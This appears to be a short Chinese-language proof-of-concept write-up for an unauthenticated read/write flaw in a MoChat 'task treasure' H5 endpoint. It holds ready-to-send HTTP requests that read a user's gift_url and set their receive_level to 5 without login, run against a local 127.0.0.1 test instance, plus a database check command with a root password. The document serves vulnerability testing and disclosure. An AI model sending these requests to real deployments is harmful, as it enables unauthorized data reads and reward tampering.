# MC-VULN-006 Yakit 请求包

- 漏洞：任务宝 H5 未鉴权读写  
- 打 `127.0.0.1:9501`，不用登录  
- 本地种子：`union_id=union_poc_test`，`fission_id=1`

发包器里整段粘贴后直接发。

## 0. 先确认接口活着

```bash
curl -sS 'http://127.0.0.1:9501/operation/workFission/taskData?union_id=union_poc_test&fission_id=1'
```

![环境](./MC-VULN-006-01-taskData.png)

## 1. 未登录读

能看到 `gift_url` 就算中。

```http
GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json
Connection: close


```

![读](./MC-VULN-006-01-taskData.png)

## 2. 未登录写

回 `code=200`；库里 `receive_level` 应变成 5。

```http
PUT /operation/workFission/receive HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Accept: application/json
Content-Length: 42
Connection: close

{"union_id":"union_poc_test","level":5}
```

![写](./MC-VULN-006-02-receive.png)

## 3. 对一下库

```bash
docker exec mochat-mysql mysql -uroot -pmochat123 -N mochat \
  -e "SELECT union_id,receive_level FROM mc_work_fission_contact WHERE union_id='union_poc_test';"
```

![库](./MC-VULN-006-03-db-receive-level.png)

读通 + 写通就可以交差了。
